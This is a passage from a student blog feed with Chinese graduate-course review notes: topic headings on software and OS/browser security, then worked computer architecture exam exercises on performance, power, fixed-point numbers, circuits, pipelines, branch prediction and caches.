&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093832998.png&#34; alt=&#34;image-20230103093832998&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093841206.png&#34; alt=&#34;image-20230103093841206&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093849198.png&#34; alt=&#34;image-20230103093849198&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;四、软件全球供应链安全&#34;&gt;&lt;a href=&#34;#四、软件全球供应链安全&#34; class=&#34;headerlink&#34; title=&#34;四、软件全球供应链安全 *&#34;&gt;&lt;/a&gt;四、软件全球供应链安全 *&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228163423463.png&#34; alt=&#34;image-20221228163423463&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		问到软件供应链和前面讲到的三部曲的过程的关系,&lt;/p&gt;
&lt;h3 id=&#34;案例&#34;&gt;&lt;a href=&#34;#案例&#34; class=&#34;headerlink&#34; title=&#34;案例 *&#34;&gt;&lt;/a&gt;案例 *&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228163448867.png&#34; alt=&#34;image-20221228163448867&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;五、操作系统安全&#34;&gt;&lt;a href=&#34;#五、操作系统安全&#34; class=&#34;headerlink&#34; title=&#34;五、操作系统安全&#34;&gt;&lt;/a&gt;五、操作系统安全&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103094248246.png&#34; alt=&#34;image-20230103094248246&#34;&gt;&lt;/p&gt;
&lt;p&gt;分段、分页&lt;/p&gt;
&lt;p&gt;段保护、页保护&lt;/p&gt;
&lt;p&gt;宏内核、微内核&lt;/p&gt;
&lt;p&gt;固件&lt;/p&gt;
&lt;h2 id=&#34;操作系统脆弱性和保护机制&#34;&gt;&lt;a href=&#34;#操作系统脆弱性和保护机制&#34; class=&#34;headerlink&#34; title=&#34;操作系统脆弱性和保护机制 *&#34;&gt;&lt;/a&gt;操作系统脆弱性和保护机制 *&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103101910978.png&#34; alt=&#34;image-20230103101910978&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;围绕缓冲区溢出对抗的博弈演进&#34;&gt;&lt;a href=&#34;#围绕缓冲区溢出对抗的博弈演进&#34; class=&#34;headerlink&#34; title=&#34;围绕缓冲区溢出对抗的博弈演进 **&#34;&gt;&lt;/a&gt;围绕缓冲区溢出对抗的博弈演进 **&lt;/h2&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103102019896.png&#34; alt=&#34;image-20230103102019896&#34; style=&#34;zoom: 25%;&#34;&gt;









&lt;h1 id=&#34;六、浏览器安全-B-x2F-S&#34;&gt;&lt;a href=&#34;#六、浏览器安全-B-x2F-S&#34; class=&#34;headerlink&#34; title=&#34;六、浏览器安全 B&amp;#x2F;S&#34;&gt;&lt;/a&gt;六、浏览器安全 B&amp;#x2F;S&lt;/h1&gt;&lt;h2 id=&#34;浏览器参考架构&#34;&gt;&lt;a href=&#34;#浏览器参考架构&#34; class=&#34;headerlink&#34; title=&#34;浏览器参考架构&#34;&gt;&lt;/a&gt;浏览器参考架构&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103102856110.png&#34; alt=&#34;image-20230103102856110&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;同源策略&#34;&gt;&lt;a href=&#34;#同源策略&#34; class=&#34;headerlink&#34; title=&#34;同源策略&#34;&gt;&lt;/a&gt;同源策略&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103103409271.png&#34; alt=&#34;image-20230103103409271&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;攻击面分析&#34;&gt;&lt;a href=&#34;#攻击面分析&#34; class=&#34;headerlink&#34; title=&#34;攻击面分析 *&#34;&gt;&lt;/a&gt;攻击面分析 *&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103103910817.png&#34; alt=&#34;image-20230103103910817&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;七、移动安全&#34;&gt;&lt;a href=&#34;#七、移动安全&#34; class=&#34;headerlink&#34; title=&#34;七、移动安全&#34;&gt;&lt;/a&gt;七、移动安全&lt;/h1&gt;</content>
        <category term="研究生课程" />
        <updated>2022-12-27T06:12:08.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/</id>
        <title>ucas-计算机体系结构-复习上</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/"/>
        <content type="html">&lt;p&gt;​		当初选这门课,就是想打牢计算机基础,没想着真要造CPU…课程确实是有点难度的,所以对于这次期末考试,我的计划是,着重复习重点的知识以及目前和可预见的将来对自己比较重要的章节,至少保证及格!! 然后学到一点东西!&lt;/p&gt;
&lt;h1 id=&#34;必考题型复习&#34;&gt;&lt;a href=&#34;#必考题型复习&#34; class=&#34;headerlink&#34; title=&#34;必考题型复习&#34;&gt;&lt;/a&gt;必考题型复习&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_43840665/article/details/122281422&#34;&gt;https://blog.csdn.net/qq_43840665/article/details/122281422&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://f.daixianiu.cn/csdn/4209862890104209.html&#34;&gt;https://f.daixianiu.cn/csdn/4209862890104209.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本科教材《》&lt;/p&gt;
&lt;p&gt;可以做做本科后面的那个习题&lt;/p&gt;
&lt;h1 id=&#34;第一二章&#34;&gt;&lt;a href=&#34;#第一二章&#34; class=&#34;headerlink&#34; title=&#34;第一二章&#34;&gt;&lt;/a&gt;第一二章&lt;/h1&gt;&lt;h3 id=&#34;考点-性能、成本、功耗的计算&#34;&gt;&lt;a href=&#34;#考点-性能、成本、功耗的计算&#34; class=&#34;headerlink&#34; title=&#34;考点: 性能、成本、功耗的计算&#34;&gt;&lt;/a&gt;考点: 性能、成本、功耗的计算&lt;/h3&gt;&lt;p&gt;性能:根据指令算IPC,两台机器比较性能,那个多长时间执行了多少指令&lt;/p&gt;
&lt;p&gt;成本:硅片成本&lt;/p&gt;
&lt;p&gt;功耗:静态功耗、动态功耗&lt;/p&gt;
&lt;h3 id=&#34;习题1-性能计算&#34;&gt;&lt;a href=&#34;#习题1-性能计算&#34; class=&#34;headerlink&#34; title=&#34;习题1: 性能计算&#34;&gt;&lt;/a&gt;习题1: 性能计算&lt;/h3&gt;&lt;p&gt;在3台不同指令系统的计算机上运行同一程序P时，A机需要执行 1.0 * 10^8 条指令，B机需要执行 2.0 * 10^8 条指令，C机需要执行4.0 * 10^8条指令，但实际执行时间都是10s。请分别计算这3台机器在运行程序P时的实际速度，以MIPS为单位。这3台计算机在运行程序P时，哪一台性能最高？为什么？&lt;/p&gt;
&lt;h3 id=&#34;解答&#34;&gt;&lt;a href=&#34;#解答&#34; class=&#34;headerlink&#34; title=&#34;解答:&#34;&gt;&lt;/a&gt;解答:&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;常用指标MIPS(Million Instructions Per Second),每秒钟执行多少条指令. 所以每个数除10s,并且再除10的6次方(百万)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果看性能的话,还是要比较时间,所以性能一样&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A:10MIPS B:20MIPS C:40MIPS&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;基础知识&#34;&gt;&lt;a href=&#34;#基础知识&#34; class=&#34;headerlink&#34; title=&#34;基础知识:&#34;&gt;&lt;/a&gt;基础知识:&lt;/h3&gt;&lt;p&gt;​		MIPS并不是很合理,因为没有说明一条指令能干多少事.目前常用的一个性能指标还有MFLOPS,它是指每秒钟做多少个浮点运算.也可能会考,这个指标也有类似的问题,没衡量能做多少事.&lt;/p&gt;
&lt;h3 id=&#34;习题5-功耗计算&#34;&gt;&lt;a href=&#34;#习题5-功耗计算&#34; class=&#34;headerlink&#34; title=&#34;习题5: 功耗计算&#34;&gt;&lt;/a&gt;习题5: 功耗计算&lt;/h3&gt;&lt;p&gt;对某处理器进行功耗测试，得到如下数据：时钟不翻转，电压1.05V时，电流为500mA；时钟频率为1GHz，电压1.1V时，电流为2500mA。请计算在1.1V下，此处理器的静态功耗以及500MHz下的总功耗。&lt;/p&gt;
&lt;h3 id=&#34;基础知识-1&#34;&gt;&lt;a href=&#34;#基础知识-1&#34; class=&#34;headerlink&#34; title=&#34;基础知识:&#34;&gt;&lt;/a&gt;基础知识:&lt;/h3&gt;&lt;p&gt;总功耗 &amp;#x3D; 动态功耗+ 静态功耗&lt;/p&gt;
&lt;p&gt;动态功耗与时钟频率(翻转率)成正比&lt;/p&gt;
&lt;h3 id=&#34;解答-1&#34;&gt;&lt;a href=&#34;#解答-1&#34; class=&#34;headerlink&#34; title=&#34;解答:&#34;&gt;&lt;/a&gt;解答:&lt;/h3&gt;&lt;p&gt;先在时钟不翻转时计算电阻, R &amp;#x3D; U&amp;#x2F;I, R&amp;#x3D;2.1欧姆. 静态功耗是不变的,此时可以计算静态功耗,静态功耗 &amp;#x3D; U*U &amp;#x2F; R  &amp;#x3D; 1.1 * 1.1 &amp;#x2F; 2.1 &amp;#x3D; 0.576w&lt;/p&gt;
&lt;p&gt;我们此时计算出1.1v,1GHz下的动态功耗,然后进行比例计算,就可以得到500MHz下的动态功耗了,&lt;/p&gt;
&lt;p&gt;1.1v,1GHz下的动态功耗 &amp;#x3D; 总功耗 - 静态功耗 &amp;#x3D; U * I - 静态功耗 &amp;#x3D; 1.1 * 2.5 - 0.576 &amp;#x3D; 2.174w&lt;/p&gt;
&lt;p&gt;所以500MHz下的动态功耗 &amp;#x3D; 500&amp;#x2F;1000 * 2.174 &amp;#x3D; 1.087 w&lt;/p&gt;
&lt;p&gt;所以500MHz下的总功耗 &amp;#x3D; 动态功耗 + 静态功耗 &amp;#x3D; 1.087 + 0.576  &amp;#x3D; 1.663w&lt;/p&gt;
&lt;h1 id=&#34;第三章-二进制与逻辑电路&#34;&gt;&lt;a href=&#34;#第三章-二进制与逻辑电路&#34; class=&#34;headerlink&#34; title=&#34;第三章 二进制与逻辑电路&#34;&gt;&lt;/a&gt;第三章 二进制与逻辑电路&lt;/h1&gt;&lt;p&gt;浮点数的表示不考,但是定点数的要考&lt;/p&gt;
&lt;h3 id=&#34;习题1-定点数的表示&#34;&gt;&lt;a href=&#34;#习题1-定点数的表示&#34; class=&#34;headerlink&#34; title=&#34;习题1:定点数的表示&#34;&gt;&lt;/a&gt;习题1:定点数的表示&lt;/h3&gt;&lt;h4 id=&#34;1-分别给出64位定点原码和补码表示的数的范围&#34;&gt;&lt;a href=&#34;#1-分别给出64位定点原码和补码表示的数的范围&#34; class=&#34;headerlink&#34; title=&#34;(1)分别给出64位定点原码和补码表示的数的范围&#34;&gt;&lt;/a&gt;(1)分别给出64位定点原码和补码表示的数的范围&lt;/h4&gt;&lt;p&gt;原码: 最高位符号位 0正 1负&lt;/p&gt;
&lt;p&gt;正: 0~ 2的63次方-1&lt;/p&gt;
&lt;p&gt;负: -(2的63次方-1) ~0&lt;/p&gt;
&lt;p&gt;综上, &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231153957522.png&#34; alt=&#34;image-20221231153957522&#34;&gt;&lt;/p&gt;
&lt;p&gt;补码:&lt;/p&gt;
&lt;p&gt;正:0~ 2的63次方-1&lt;/p&gt;
&lt;p&gt;负:-2的63次方 ~ -1&lt;/p&gt;
&lt;p&gt;综上&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231153942328.png&#34; alt=&#34;image-20221231153942328&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231233557002.png&#34; alt=&#34;image-20221231233557002&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-在32位定点补码表示中-0x80000000表什么数&#34;&gt;&lt;a href=&#34;#2-在32位定点补码表示中-0x80000000表什么数&#34; class=&#34;headerlink&#34; title=&#34;(2)在32位定点补码表示中,0x80000000表什么数&#34;&gt;&lt;/a&gt;(2)在32位定点补码表示中,0x80000000表什么数&lt;/h4&gt;&lt;p&gt;1000 0000 0000 0000 0000  0000  0000  0000  &lt;/p&gt;
&lt;p&gt;这个是补码,转换成原码后再算,&lt;/p&gt;
&lt;p&gt;最高位不变,其余转换,然后最低位+1, 于是得到 32个0和最高位的1,溢出了??????????????&lt;/p&gt;
&lt;p&gt;所以答案是-2的31次方&lt;/p&gt;
&lt;h3 id=&#34;习题三-画出-e-x3D-a-amp-b-c-amp-d-的晶体管级电路图&#34;&gt;&lt;a href=&#34;#习题三-画出-e-x3D-a-amp-b-c-amp-d-的晶体管级电路图&#34; class=&#34;headerlink&#34; title=&#34;习题三:画出 e&amp;#x3D;a&amp;amp;b | c&amp;amp;d 的晶体管级电路图&#34;&gt;&lt;/a&gt;习题三:画出 e&amp;#x3D;a&amp;amp;b | c&amp;amp;d 的晶体管级电路图&lt;/h3&gt;&lt;p&gt;本科教材p184&lt;/p&gt;
&lt;p&gt;解法1:&lt;/p&gt;
&lt;p&gt;首先由N管组成“正逻辑”,串联表示与,并联表示或. 再用P管组成“反逻辑”,串联表示或,并联表示与.最后再把正反逻辑串联&lt;/p&gt;
&lt;p&gt;这得到的是 ~(a&amp;amp;b | c&amp;amp;d ), 可以加一个反相器,&lt;/p&gt;
&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231161439711.png&#34; alt=&#34;image-20221231161439711&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;p&gt;解法2: &lt;/p&gt;
&lt;p&gt;先做一个转换,转换成两级与非门的逻辑,然后再画,与非门什么的参考本科教材, 转换的话,记住那些转换公式&lt;/p&gt;
&lt;p&gt; e&amp;#x3D;a&amp;amp;b | c&amp;amp;d  &amp;#x3D; &lt;del&gt;(&lt;/del&gt;(A&amp;amp;B) &amp;amp; ~(C&amp;amp;D))&lt;/p&gt;
&lt;p&gt;还是这个做法:首先由N管组成“正逻辑”,串联表示与,并联表示或. 再用P管组成“反逻辑”,串联表示或,并联表示与.最后再把正反逻辑串联&lt;/p&gt;
&lt;p&gt;分别8⃣️&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231201126197.png&#34; alt=&#34;image-20221231201126197&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;习题四-计算一个FO4的延迟-假设反相器的输入电容位0-0036pF-平均每个负载连线电容位0-0044pF-翻转延迟位0-023ns-每pF延迟为4-5ns&#34;&gt;&lt;a href=&#34;#习题四-计算一个FO4的延迟-假设反相器的输入电容位0-0036pF-平均每个负载连线电容位0-0044pF-翻转延迟位0-023ns-每pF延迟为4-5ns&#34; class=&#34;headerlink&#34; title=&#34;习题四: 计算一个FO4的延迟,假设反相器的输入电容位0.0036pF,平均每个负载连线电容位0.0044pF,翻转延迟位0.023ns,每pF延迟为4.5ns&#34;&gt;&lt;/a&gt;习题四: 计算一个FO4的延迟,假设反相器的输入电容位0.0036pF,平均每个负载连线电容位0.0044pF,翻转延迟位0.023ns,每pF延迟为4.5ns&lt;/h3&gt;&lt;p&gt;课本p48&lt;/p&gt;
&lt;p&gt;FO4延迟 &amp;#x3D; 本征延迟(本身延迟) + 负载延迟 &amp;#x3D; 0.023 + 4.5((0.0036+0.0044)*4) &amp;#x3D; 0.167ns&lt;/p&gt;
&lt;p&gt;负载延迟又和该电源的负载相关&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231201615028.png&#34; alt=&#34;image-20221231201615028&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;第五章-静态流水线&#34;&gt;&lt;a href=&#34;#第五章-静态流水线&#34; class=&#34;headerlink&#34; title=&#34;第五章 静态流水线&#34;&gt;&lt;/a&gt;第五章 静态流水线&lt;/h1&gt;&lt;p&gt;哪个是真相关,哪个是假相关?&lt;/p&gt;
&lt;p&gt;五级流水的时空图,前递 ,有无前递(旁路)&lt;/p&gt;
&lt;p&gt;给几条指令,有无前递的 画出来&lt;/p&gt;
&lt;p&gt;和转移相关的就比较复杂了,&lt;/p&gt;
&lt;p&gt;这里不能够前递是因为取址loadword指令的话需要访存阶段才能够拿到数值吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221226163902930.png&#34; alt=&#34;image-20221226163902930&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;空操作指令-nop的作用&#34;&gt;&lt;a href=&#34;#空操作指令-nop的作用&#34; class=&#34;headerlink&#34; title=&#34;空操作指令 nop的作用&#34;&gt;&lt;/a&gt;空操作指令 nop的作用&lt;/h2&gt;&lt;p&gt;空操作指令(nop 指令)，其不改变程序可见寄存器、状态寄存器以及内存的状态，以及用于等待需要一定周期执行的操作。nop 指令的作用，常见的有：取指的强制访存对齐（memory alignment），防止相关风险（hazard），以及用于填充延迟槽（branch delay slot）。&lt;/p&gt;
&lt;h1 id=&#34;第六章&#34;&gt;&lt;a href=&#34;#第六章&#34; class=&#34;headerlink&#34; title=&#34;第六章&#34;&gt;&lt;/a&gt;第六章&lt;/h1&gt;&lt;p&gt;执行延迟:统一到这个&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221226160418121.png&#34; alt=&#34;image-20221226160418121&#34;&gt;&lt;/p&gt;
&lt;p&gt;mips 转移指令有延迟槽??&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_43752162/article/details/122136323&#34;&gt;https://blog.csdn.net/weixin_43752162/article/details/122136323&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;前递-旁路-有哪几种&#34;&gt;&lt;a href=&#34;#前递-旁路-有哪几种&#34; class=&#34;headerlink&#34; title=&#34;前递(旁路)有哪几种?&#34;&gt;&lt;/a&gt;前递(旁路)有哪几种?&lt;/h3&gt;&lt;p&gt;mem -》 ex&lt;/p&gt;
&lt;p&gt;ex -〉 ex&lt;/p&gt;
&lt;p&gt;啥叫全旁路??&lt;/p&gt;
&lt;p&gt;load的时候需要在mem才能给前递??&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231224522974.png&#34; alt=&#34;image-20221231224522974&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;mips寄存器&#34;&gt;&lt;a href=&#34;#mips寄存器&#34; class=&#34;headerlink&#34; title=&#34;mips寄存器&#34;&gt;&lt;/a&gt;mips寄存器&lt;/h1&gt;&lt;h1 id=&#34;第七章-多发射&#34;&gt;&lt;a href=&#34;#第七章-多发射&#34; class=&#34;headerlink&#34; title=&#34;第七章 多发射&#34;&gt;&lt;/a&gt;第七章 多发射&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102135923351.png&#34; alt=&#34;image-20230102135923351&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;第八章-转移预测&#34;&gt;&lt;a href=&#34;#第八章-转移预测&#34; class=&#34;headerlink&#34; title=&#34;第八章 转移预测&#34;&gt;&lt;/a&gt;第八章 转移预测&lt;/h1&gt;&lt;p&gt;今年大概率考那个预测情况,推演?看ppt&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101151357744.png&#34; alt=&#34;image-20230101151357744&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-…-的分支预测正确率。（2021复习题）&#34;&gt;&lt;a href=&#34;#分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-…-的分支预测正确率。（2021复习题）&#34; class=&#34;headerlink&#34; title=&#34;分析：for (i&amp;#x3D;0;i&amp;lt;10;i++) for(j&amp;#x3D;0;j&amp;lt;10;j++){…}的分支预测正确率。（2021复习题）&#34;&gt;&lt;/a&gt;分析：for (i&amp;#x3D;0;i&amp;lt;10;i++) for(j&amp;#x3D;0;j&amp;lt;10;j++){…}的分支预测正确率。（2021复习题）&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101151819819.png&#34; alt=&#34;image-20230101151819819&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-for-k-x3D-0-k-lt-10-k-…-的分支预测正确率。（2021真题）&#34;&gt;&lt;a href=&#34;#分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-for-k-x3D-0-k-lt-10-k-…-的分支预测正确率。（2021真题）&#34; class=&#34;headerlink&#34; title=&#34;分析：for (i&amp;#x3D;0;i&amp;lt;10;i++) for(j&amp;#x3D;0;j&amp;lt;10;j++) for(k&amp;#x3D;0;k&amp;lt;10;k++){…}的分支预测正确率。（2021真题）&#34;&gt;&lt;/a&gt;分析：for (i&amp;#x3D;0;i&amp;lt;10;i++) for(j&amp;#x3D;0;j&amp;lt;10;j++) for(k&amp;#x3D;0;k&amp;lt;10;k++){…}的分支预测正确率。（2021真题）&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101223213584.png&#34; alt=&#34;image-20230101223213584&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101160414867.png&#34; alt=&#34;image-20230101160414867&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102114754390.png&#34; alt=&#34;image-20230102114754390&#34;&gt;&lt;/p&gt;
&lt;p&gt;（7+9&lt;em&gt;99）&amp;#x2F;1000,(7+9&lt;/em&gt;9)&amp;#x2F;100,7&amp;#x2F;10?&lt;/p&gt;
&lt;p&gt;for(R3&amp;#x3D;9;R3&amp;gt;0;R3–)for(R2&amp;#x3D;9;R2&amp;gt;0;R2–)for(R1&amp;#x3D;9;R1&amp;gt;0;R1–){…}&lt;/p&gt;
&lt;p&gt;R0的值恒为0&lt;/p&gt;
&lt;p&gt;BENZ，BEQZ均为条件分支指令；&lt;br&gt;BENZ R1,NAME;&amp;#x2F;&amp;#x2F;R1不等于0，程序跳转，以NAME为偏移地址&lt;br&gt;BEQZ R1,NAME;&amp;#x2F;&amp;#x2F;R1&amp;#x3D;0，程序跳转到，以NAME为偏移地址&lt;br&gt;否则，执行下一条指令&lt;/p&gt;
&lt;p&gt;**bne (不相等则分支):**bne $s0,$s1,L1&lt;/p&gt;
&lt;h1 id=&#34;第九章-运算部件&#34;&gt;&lt;a href=&#34;#第九章-运算部件&#34; class=&#34;headerlink&#34; title=&#34;第九章 运算部件&#34;&gt;&lt;/a&gt;第九章 运算部件&lt;/h1&gt;&lt;p&gt;华莱士树&lt;/p&gt;
&lt;h1 id=&#34;第十章-高速缓存&#34;&gt;&lt;a href=&#34;#第十章-高速缓存&#34; class=&#34;headerlink&#34; title=&#34;第十章: 高速缓存&#34;&gt;&lt;/a&gt;第十章: 高速缓存&lt;/h1&gt;&lt;p&gt;VIPT(虚index,实tag)结构中,需要在cache中使用页着色技术.vipt即用虚拟地址索引cache,用物理地址匹配tag&lt;/p&gt;
&lt;p&gt;当vipt的cache,每一路的容量大于页的大小的时候,就会出现cache别名问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231211724962.png&#34; alt=&#34;image-20221231211724962&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个同学总结的非常精辟…我就不多费时间了…&lt;/p&gt;
